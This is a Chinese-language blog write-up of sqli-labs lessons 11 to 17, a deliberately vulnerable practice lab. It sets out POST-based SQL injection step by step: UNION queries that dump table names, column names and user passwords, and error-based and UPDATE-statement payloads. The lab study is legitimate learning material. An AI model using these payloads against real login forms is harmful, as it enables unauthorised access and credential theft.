---
title: sqli labs lesson 11~17 学习
date: 2016-08-26 21:37:10
tags:
- 渗透测试
- SQL 注入
categories: SQL 注入
---
lesson 11~16的 SQL Injection 原理和lesson 1~10一样，只是lesson 11~16 是通过post传参，即在页面文本框中输入数据，而lesson 1~10是URL中传参。
<!-- more -->

# 1 lesson 11 POST-基于错误-单引号
在输入框输入 admin 和 password，页面显示 `LOGIN ATTEMPT FAILED`
![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg)

## 1.1 判断注入类型
输入 | 结果
-- | --
`admin password`   | 页面显示 `LOGIN ATTEMPT FAILED`
`admin password"`   | 页面显示 `LOGIN ATTEMPT FAILED`
`admin password'`  | 页面显示语法错误

![](http://ww2.sinaimg.cn/large/005CA6ZCgw1f77hmjpaa7j311t07twfw.jpg)
"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''password'' LIMIT 0,1' at line 1"

说明是基于错误的、单引号注入

sql 语句 ：`select * from tables where username='$username' and password='$password' limit 0,1`

## 1.2 验证注入类型
- 参数 $username=`admin' and 1=1#`   $password 为空
- sql 语句  `select * from tables where username='admin' and 1=1#' and password='' limit 0,1`

![](http://ww2.sinaimg.cn/large/005CA6ZCgw1f77hwezjw1j30k00f2mzb.jpg)

账号：admin   密码：admin
SUCCESSFULLY LOGGED IN

## 1.3 order by 判断字段个数
username | 结果
-- | --
admin' and 1=1 order by 1# | SUCCESSFULLY LOGGED IN
admin' and 1=1 order by 5# | Unknown column '5' in 'order clause'  &  LOGIN ATTEMPT FAILED
admin' and 1=1 order by 3# | Unknown column '3' in 'order clause'  &  LOGIN ATTEMPT FAILED
admin' and 1=1 order by 2# | SUCCESSFULLY LOGGED IN

从数据库中 <font color="red">选取了 2 个字段</font> 
sql 语句：`select col1,col2 from tables where username='$username' and password='$password' limit 0,1`

## 1.4 利用 information_schema 获得信息
### 1.4.1 union 获得数据库和版本
username：  `' union select 1,2#`
![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f79b3e50bhj30fa09qjrz.jpg)
1,2 可以在页面上显示

username ： `' union select database(),version()#`
![](http://ww2.sinaimg.cn/large/005CA6ZCgw1f79b42mszyj30fa09st9f.jpg)
数据库：security
版本：5.6.17
### 1.4.2 表名
username： `' union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=database()#`
![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f79b4vbkc2j30fa09qjs4.jpg)
表：emails,referers,uagents,users

### 1.4.3 字段名
username： `' union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema=database()#`
![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f79b7ei1aej30h80a0ab0.jpg)
字段名：id,email_id,referer,ip_address,uagent,username,password

### 1.4.4 账号和密码
username： `' union select group_concat(username),group_concat(password) from users#`
![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f79bb7r92nj30p70acq4e.jpg)

username | password | username | password
-- | --| --| --
Dumb | Dumb | Angelina | I-kill-you
Dummy | p@ssword | secure | crappy
stupid | stupidity | superman | genious
batman | mob!le | admin | admin
admin1 | admin1 | admin2 | admin2
admin3 | admin3 | dhakkan | dumbo
admin4 | admin4 |   |  

# 2 lesson 12 POST-基于错误-双引号-一个括号
## 2.1 判断注入类型
输入 | 说明
-- | --
admin ' | 页面显示 `LOGIN ATTEMPT FAILED`
admin " | You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"admin "") and password=("") LIMIT 0,1' at line 1
admin ")# | SUCCESSFULLY LOGGED IN

![](http://ww2.sinaimg.cn/large/005CA6ZCgw1f79bqwm64dj30k00emtax.jpg)
<font color="red"> 说明是双引号闭合，且有括号</font>

其他获取数据库信息的步骤同 lesson 11

# 3 lesson 13 POST-基于错误-二次注入-单引号-一个括号
注入原理请参见：[sqli labs lesson 5~7 学习](http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/)
## 3.1 判断注入类型
输入 | 说明
-- | --
admin ' | You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin '') and password=('') LIMIT 0,1' at line 1
admin')#| SUCCESSFULLY LOGGED IN

 说明是单引号闭合，且有括号

## 3.2 构造编译正确，运行可能出错的sql
sql： `select count(*),concat(database(),0x40,floor(rand()*2))a from information_schema.tables where table_schema=database() group by a`
username：') union select count(*),concat(database(),0x40,floor(rand()*2))a from information_schema.tables where table_schema=database() group by a#

相同的输入，多次提交
![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f79de281uuj30fa082dgc.jpg)

错误：Duplicate entry 'security@1' for key 'group_key'
说明数据库名字：security
同样的方法获取其他数据库信息

# 4 lesson 14 POST-基于错误-二次注入-单双引号
username：`" union select count(*),concat(database(),0x40,floor(rand()*2))a from information_schema.tables where table_schema=database() group by a#`

除了闭合方式是双引号，其他注入过程同 lesson 13

# 5 lesson 15 POST 盲注-基于bool型
思路同 [sqli labs lesson 8~10 学习](sqli labs lesson 8~10 学习) lesson 8 盲注-基于bool值

# 6 lesson 16 POST 盲注-基于时间
思路同 [sqli labs lesson 8~10 学习](sqli labs lesson 8~10 学习) lesson 9 盲注-基于时间-单引号

# 7 lesson 17 POST-UPDATE-基于错误
在文本框输入用户名和密码，显示“ SUCCESSFULLY UPDATED YOUR PASSWORD”，更新密码成功！！！

![](http://ww3.sinaimg.cn/large/005CA6ZCjw1f7d1oyjo66j30jq0eqdix.jpg)
## 1.1 判断注入类型
username | new password | 结果
-- | -- | --
admin | 12345 | SUCCESSFULLY UPDATED YOUR PASSWORD（密码更新成功）
admin' | 123 | BUG OFF YOU SILLY DUMB HACKER
admin | ' |  check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1（语法错误）
admin | ') | check the manual that corresponds to your MySQL server version for the right syntax to use near ')' WHERE username='admin'' at line 1| 
admin | " | SUCCESSFULLY UPDATED YOUR PASSWORD
admin | ") | SUCCESSFULLY UPDATED YOUR PASSWORD

<font color="red"> 
参数是用 单引号' 闭合的
sql语句：`update tables set password='$NewPassword' where username='$username' limit 0,1`
</font>

## 1.2 获取数据库信息
<font color="red">注意，下面的注入，一不小心可能把数据库的user表的密码表给清空了</font>

编译正确，但运行可能出错的sql语句，如果不懂sql语句的构造过程，请参见[sqli labs lesson 5~7 学习](http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/)lesson 5
`select count(*),(concat("~",database(),"~",floor(rand()*2)))c from information_schema.tables group by c`

但是上诉sql语句查询结果有多列，因此需从中选取一列
`select 1 from (select count(*),(concat("~",database(),"~",floor(rand()*2)))c from information_schema.tables group by c)a`

- username：`admin`
- new password：`' or (select 1 from (select count(*),(concat("~",database(),"~",floor(rand()*2)))c from information_schema.tables group by c)a)#`

多次运行之后，可能出现如下错误：
![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f7ecqle3ivj30k00fgn0l.jpg)

数据库名字会显示在页面上，以相同的方法获取数据库其他信息，具体过程，参见参见[sqli labs lesson 5~7 学习](http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/)lesson 5。


